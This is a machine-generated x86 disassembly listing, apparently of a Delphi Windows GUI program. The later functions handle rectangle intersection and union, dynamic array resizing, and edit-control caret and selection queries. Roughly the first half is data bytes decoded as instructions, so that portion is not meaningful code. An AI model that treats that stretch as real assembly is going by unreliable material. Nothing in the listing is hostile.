add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x69560f00
jae r-xdata
add ah bh
add [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
and al 0x0
adc [ eax ] al
test eax 0xd8ff0001
dec edx
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
jb r-xdata
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsd
jo r-xdata
jb r-xdata
adc [ ecx ] eax
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
sbb al 0x2
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
xlat
inc esp
add [ eax + eax ] bh
inc [ ecx ]
inc ebx
inc edi
je r-xdata
mov [ bx + di ] dl
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x93
jo r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
dec edi
jbe r-xdata
mov al [ 0xffffffffa0004624 ]
push eax
add [ eax + 0x4f0e0030 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
outsd
ja r-xdata
bound ebp [ ebp + 0x52 ]
add al [ eax ]
jmp [ eax + 0x1ff0002 ]
jo r-xdata
add [ eax + 0x4f09003b ] al
outsb
imul esi [ fs : ebp + ecx * 2 + 0x61 ] 0x27cc6b73
inc esi
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d003a ] al
outsb
inc edi
je r-xdata
dec edi
jb r-xdata
insb
inc ebx
insb
xchg ecx eax
outsb
inc ebp
outsb
inc esp
jb r-xdata
dec edi
jb r-xdata
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9453156
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ ecx ] eax
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
or cl [ edi + 0x6e ]
dec ebx
jns r-xdata
imul esi [ fs : esp + edx * 2 + 0x65 ] 0x914c7478
inc ebx
add al bl
add [ eax ] eax
xor al 0x0
or cl [ edi + 0x6e ]
adc [ ecx ] eax
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] al
push es
dec edi
outsb
inc ebp
js r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
inc esp
jb r-xdata
and al 0x46
add [ eax - 0x5f00fffe ] ah
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
loopne r-xdata
jo r-xdata
nop
inc ebx
add al bl
cwde
xchg ecx eax
inc ebx
add al ah
add [ eax ] eax
jmp eax
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ebx ] cl
jb r-xdata
add [ eax + 0x4f070037 ] al
add [ eax ] al
ja r-xdata
dec ebx
jns r-xdata
cmp eax [ eax ]
or [ edi + 0x6e ] ecx
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
xchg edi eax
inc ebx
add [ eax + 0x1 ] al
add bh bh
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100041 ] al
outsb
dec ebp
outsd
jne r-xdata
nop
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003e ] al
outsb
dec ebp
outsd
jne r-xdata
jne r-xdata
dec ebp
outsd
jbe r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
jae r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4 ] bp
xchg ebx eax
insb
insb
add al 0x93
inc ebx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
outsb
inc ebp
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
aaa
add [ edi ] al
dec edi
daa
inc esi
add [ eax - 0x5700fffe ] ch
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0039 ] al
outsb
outsb
push edx
outsd
ja r-xdata
push ebp
jo r-xdata
dec edi
push edi
push 0x446c6565
outsd
ja r-xdata
insb
inc esp
outsd
ja r-xdata
je r-xdata
push edi
push 0x556c6565
jo r-xdata
add [ eax + 0x4f0e0042 ] al
outsb
dec ebp
outsd
jo r-xdata
add [ eax ] al
jmp eax
dec esp
xchg ecx eax
inc ebx
add al ch
add [ eax ] eax
imul esi [ esp + edx * 2 + 0x65 ] 0x94c47478
outsd
jbe r-xdata
inc esp
insb
inc edi
add [ ebx ] cl
dec edi
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0046 ] al
imul esi [ fs : esp + edx * 2 + 0x65 ] 0x94c47478
arpl [ gs : ebx + eax * 2 + 0x65 ] si
insb
insb
sub al 0x28
inc esi
add al cl
add al [ eax ]
dec eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0045 ] al
outsb
push ebx
je r-xdata
and al 0x97
inc ebx
add [ eax + 0x1 ] cl
add bh bh
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
call 0xffffffffd84676bd
sub [ esi ] al
mov eax 0xb8ff0002
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0043 ] al
inc ebx
add al ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4635 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x18004635 ] al
add [ eax ] al
jb r-xdata
outsb
push ebx
je r-xdata
add [ eax ] al
add [ esi ] 0xb
dec edi
outsb
push ebx
insb
cmp [ fs : esi + eax * 2 ] ah
add al al
add al [ eax ]
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0044 ] al
add ah ah
xor al 0x40
xor al 0x40
jb r-xdata
add ah ch
xor al 0x40
add al ah
and al 0x44
add [ eax ] ch
imul ebp [ esi + 0x67 ] 0x64697247
push ebx
je r-xdata
add al bh
sbb [ ecx ] eax
fdiv [ eax + eax * 2 ]
add [ eax ] al
add [ eax ] al
xor [ 0x180046 ] 0x0
outsb
push ebx
je r-xdata
inc esp
outsd
arpl [ ebx - 0x44 ] bp
xchg edx eax
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0047 ] al
inc ecx
add [ ecx + eax * 2 ] dl
inc ecx
add [ ebp + eax * 2 + 0x41 ] cl
add ah ah
test al 0x46
add [ ebx + ebp * 4 + 0x47d00046 ] ch
inc ecx
add ah ch
stosd [ edi ]
inc esi
add [ eax ] dl
lodsb [ esi ]
inc esi
add [ eax ] dh
dec eax
inc ecx
add [ eax - 0x3fffb954 ] dl
lodsb [ esi ]
inc esi
add [ eax + 0x4e ] ch
inc ecx
add al dh
dec esi
inc ecx
add al dh
lodsb [ esi ]
inc esi
add [ eax ] bh
push eax
inc ecx
add [ edx + ebp * 4 ] bl
inc esi
add [ eax + 0x43 ] ch
inc ecx
add [ ebx + eax * 2 - 0x550fffbf ] cl
inc esi
add [ ebx + ebp * 4 + 0x46 ] ah
add al ch
inc esi
inc ecx
add ah bl
inc edi
inc ecx
add [ eax + 0x49 ] bl
inc ecx
add ah ah
dec ecx
inc ecx
add [ eax + 0x4400414a ] bh
lodsb [ esi ]
inc esi
add ah ch
dec edx
inc ecx
add [ ebx + ecx * 2 ] bl
inc ecx
add [ eax + 0x4b ] dh
inc ecx
add [ esp + ecx * 2 ] bl
inc ecx
add [ ebp + ecx * 2 + 0x4e0c0041 ] dh
inc ecx
add [ eax + 0x1200414e ] ah
push esp
push ebx
je r-xdata
inc eax
add [ edx + esi + 0x40 ] al
add [ ebx + eax * 2 ] dl
inc esp
jb r-xdata
inc esp
add [ ebx + 0x497c0044 ] al
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
xor al [ eax ]
inc esp
xor al [ eax ]
imul ebp [ esi + 0x67 ] 0x35989073
inc esi
add [ edi ] al
adc dl [ ebx + edx * 2 + 0x74 ]
jb r-xdata
add al ch
xor al 0x40
add ah ch
xor al 0x40
inc eax
mov [ bx + di ] dl
inc ecx
add al dl
add al [ eax ]
call eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100048 ] al
outsb
push esp
outsd
jo r-xdata
jb r-xdata
add [ eax ] dh
dec edx
inc esi
add [ edi + ebp * 4 + 0x46 ] ah
add [ esp + ebx * 4 ] dh
inc esi
add al bh
inc esp
add ah bl
inc sp
add [ eax + 0x5b ] dh
inc esp
add al bh
inc ebp
inc esp
add al ch
dec eax
inc esp
add [ eax + 0x4004655 ] dh
pushad
inc esi
add al ah
jl r-xdata
add [ ebx + 0x44 ] bh
add [ esp + eax + 0x479c0044 ] bh
inc esp
add [ eax + 0x48 ] bl
inc esp
add [ ebx + eax * 2 + 0x44 ] dl
add [ eax + ecx * 2 ] bh
inc esp
add ah dl
or [ eax + eax + 0x68 ] eax
adc [ eax + eax + 0x8 ] al
push ds
inc esp
add al dh
jl r-xdata
inc esp
lodsd [ esi ]
inc esi
add [ eax + 0x8004454 ] al
outsb
inc edi
jb r-xdata
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
adc al 0x43
je r-xdata
inc esp
and al 0xc
mov [ ecx + 0x4 ] eax
mov eax [ esp + 0x4 ]
outsb
inc edi
jb r-xdata
cdq
inc esi
add [ edx + ebx * 4 ] bl
inc esi
add [ eax + eax ] al
stosb [ edi ]
[ edi - 0x56005101 ]
add al dh
sbb al [ eax + eax + 0x20 ]
sbb [ eax + eax - 0x60 ] eax
push ds
inc esp
add [ esi + ebx + 0x1d5c0044 ] ah
dec ebp
inc esi
add [ eax ] dh
inc eax
inc ecx
add [ edx + eax ] bh
push esp
inc esp
add [ eax ] cl
push ebx
je r-xdata
add al ah
xor al 0x40
inc eax
push 0x65676e61
lea eax [ eax ]
add [ 0x46 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
xor eax 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax [ esp + 0x4 ]
mov [ ecx + 0xc ] eax
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
jle r-xdata
mov [ ecx + 0x4 ] eax
cmp eax [ esp + 0xc ]
jge r-xdata
add al 0x8b
inc esp
and al 0x4
or al 0x36
inc esi
add [ ebx + ebp + r--data ] dh
add eax 0x64697247
jae r-xdata
inc esp
add [ esi + edx * 8 ] bl
inc ebx
add [ ecx + ecx + 0x44 ] bl
add [ edi + ebx * 8 ] dh
inc ebx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add ah bh
lodsb [ esi ]
inc esi
add [ edi + ecx * 2 + 0x54b00044 ] dl
inc esp
add ah bh
push ebx
inc esp
add [ eax + 0x100043d4 ] dl
dec edx
inc esp
add [ eax ] dh
dec edx
inc esp
add [ eax + 0x47 ] cl
inc esp
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add [ edi + ebx * 8 ] bl
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
imul ebp [ esi + 0x67 ] 0x46350073
add al ah
sbb al [ ecx ]
add [ eax ] al
add eax 0x64697247
jae r-xdata
add esp 0x10
pop edi
pop esi
retn
mov [ ecx + 0xc ] eax
add [ eax - 0x742774ad ] dl

add [ ebx + 0x46360cc0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
aaa
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
inc esi
add [ esi ] cl
aaa
inc esi
add ah ch
add al [ eax ]
add [ edx + ebp + 0x46 ] dh
add [ ebx + ebx * 4 + 0x34e40041 ] bl
inc eax
add al dh
xchg esp eax
inc ecx
sub_463758
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ esp + 0x8 ]
mov [ ecx ] eax
mov eax [ esp ]
cmp eax [ esp + 0x8 ]
jge r-xdata
mov eax [ esp ]
mov [ ecx + 0x8 ] eax
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jle r-xdata
mov [ ecx ] eax
mov eax [ esp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ esp + 0x4 ]
cmp eax [ esp + 0xc ]
jge r-xdata
mov [ ecx + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ ecx + 0xc ] eax
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
jle r-xdata
mov [ ecx + 0x4 ] eax
add esp 0x10
pop edi
pop esi
retn
mov [ ecx + 0xc ] eax
sub_4637f8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_4637dc
test al al
jne r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_4637dc
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov edx [ ebx ]
mov [ esi ] edx
mov edx [ ebx + 0x4 ]
mov [ esi + 0x4 ] edx
xor eax eax
jmp r-xdata
test al al
je r-xdata
sub_463844
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax edi
call sub_4637f8
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4637f8
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0xc ]
push eax
lea edx [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
call sub_4637f8
pop ecx
test al al
jne r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0xc ] edx
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0xc ] edx
jmp r-xdata
sub_4638bc
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax ebx
xor ecx ecx
mov edx 0x40
call sub_402cac
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call UnionRect
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x28 ]
call sub_412618
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x28 ]
call sub_412618
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x28 ]
call sub_412618
lea edx [ ebp - 0x40 ]
mov eax ebx
pop ecx
call sub_463844
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov esi eax
mov edi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov esi eax
lea edi [ ebx + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
call sub_412618
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x10 ]
call sub_412618
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x18 ]
call sub_412618
lea edx [ ebp - 0x40 ]
lea eax [ ebx + 0x10 ]
pop ecx
call sub_463844
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebx + 0x8 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_412618
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_412618
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x20 ]
call sub_412618
lea edx [ ebp - 0x40 ]
lea eax [ ebx + 0x20 ]
pop ecx
call sub_463844
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebx + 0x1c ] eax
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_412618
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
call sub_412618
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x28 ]
call sub_412618
lea edx [ ebp - 0x40 ]
lea eax [ ebx + 0x30 ]
pop ecx
call sub_463844
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebx + 0x20 ] eax
mov eax [ ebp - 0xc ]
mov [ ebx + 0x34 ] eax
sub_463a4c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_463b2b
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463b32
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404004
retn
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov esi [ eax ]
xor esi esi
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b10
mov eax [ ebp - 0x8 ]
call sub_463740
cmp esi [ ebp - 0x4 ]
jge r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
cmp esi 0x7fffffe
jl r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b10
mov eax [ ebp - 0xc ]
call sub_463740
jmp r-xdata
add edi esi
mov esi edi
test esi esi
jge r-xdata
test esi esi
jle r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b10
mov eax [ ebp - 0x10 ]
call sub_463740
mov edx esi
shl edx 0x2
mov eax ebx
call sub_4026fc
cmp [ ebx ] 0x0
je r-xdata
inc esi
mov eax [ ebp - 0x4 ]
inc eax
cmp esi eax
jle r-xdata
dec esi
mov eax [ ebx ]
mov [ eax ] esi
mov edx [ ebx ]
mov ecx [ ebp + 0x8 ]
mov [ edx + eax * 4 ] ecx
inc eax
cmp esi eax
jg r-xdata
sub_463b3c
push ebx
push esi
xor esi esi
cmp [ eax ] 0x0
je r-xdata
push ecx
mov ecx edx
sub ecx esi
mov edx esi
call sub_463a4c
pop esi
pop ebx
retn
mov ebx [ eax ]
mov esi [ ebx ]
sub_463b58
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebx eax
cmp [ ebx ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx ]
mov edi [ eax + edx * 4 ]
cmp esi edx
jle r-xdata
cmp esi edx
jge r-xdata
mov eax esi
sub eax edx
mov ecx eax
shl ecx 0x2
mov eax [ ebx ]
lea eax [ eax + edx * 4 + 0x4 ]
mov ebp [ ebx ]
lea edx [ ebp + edx * 4 ]
call sub_4028b8
jmp r-xdata
mov eax [ ebx ]
mov [ eax + esi * 4 ] edi
mov eax [ ebx ]
lea eax [ eax + esi * 4 ]
mov ecx [ ebx ]
lea ecx [ ecx + esi * 4 + 0x4 ]
sub edx esi
shl edx 0x2
xchg edx ecx
call sub_4028b8
sub_463bb0
push ebx
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
test edi edi
sete dl
test edi edi
je r-xdata
mov eax edx
pop edi
pop esi
pop ebx
retn
mov esi [ eax ]
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
inc esi
xor ecx ecx
inc ecx
dec esi
jne r-xdata
mov ebx [ eax + ecx * 4 ]
cmp ebx [ edi + ecx * 4 ]
jne r-xdata
sub_463bec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4601f4
xor edx edx
mov eax esi
call sub_444ad8
xor edx edx
mov eax esi
call sub_444aa8
xor edx edx
mov eax esi
call sub_444b9c
xor edx edx
mov eax esi
call sub_434afc
mov [ esi + 0x1f8 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_463c68
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x240 ]
test [ eax + 0x249 ] 0x8
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x2
sub_463c90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4606e8
sub_463cb0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_463cd0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4606b4
sub_463d04
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x1 ] dl
lea edx [ ebp - 0x9 ]
push edx
mov dl [ ebp - 0x1 ]
mov eax [ eax + 0x240 ]
mov si 0xffe2
call sub_40348c
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_463d4c
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov cl [ eax - 0x9 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x240 ]
mov si 0xffbc
call sub_40348c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax ] 0x0
pop esi
pop ebp
retn
sub_463d80
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x240 ]
mov edx [ eax + 0x1d8 ]
mov [ ebp - 0x8 ] edx
mov edx [ eax + 0x1dc ]
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov dl [ edx - 0x9 ]
push edx
mov edx [ ebp + 0x8 ]
mov ecx [ edx - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
sub_463df4
push ebp
mov ebp esp
push ebx
mov ebx eax
lea eax [ ebx + 0x4 ]
push eax
push ebx
push 0xb0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_444968
push eax
call SendMessageA
pop ebx
pop ebp
retn
sub_463e18
push ebp
mov ebp esp
add esp 0xfffffff8
lea eax [ ebp - 0x8 ]
push eax
call GetCaretPos
mov dx [ ebp - 0x4 ]
mov ax [ ebp - 0x8 ]
call sub_406998
push eax
push 0x0
push 0xd7
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_444968
push eax
call SendMessageA
pop ecx
pop ecx
pop ebp
retn
sub_463e54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
call sub_463df4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4604cc
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
call sub_463e18
pop ecx
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ ebp - 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4604cc
cmp eax [ ebp - 0x4 ]
je r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov al 0x1
sub_463eac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
call sub_463df4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_463e18
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4604cc
cmp ebx eax
je r-xdata
sub_463ef8
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
cmp eax 0x26
jg r-xdata
cmp eax 0x2d
jg r-xdata
je r-xdata
sub eax 0x2e
je r-xdata
je r-xdata
push ebp
call sub_463d4c
pop ecx
jmp r-xdata
cmp eax 0x23
jg r-xdata
push ebp
call sub_463de4
pop ecx
test al al
je r-xdata
sub eax 0x43
je r-xdata
mov al [ r-xdata ]
cmp al [ ebp - 0x9 ]
jne r-xdata
sub eax 0x27
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x24
je r-xdata
je r-xdata
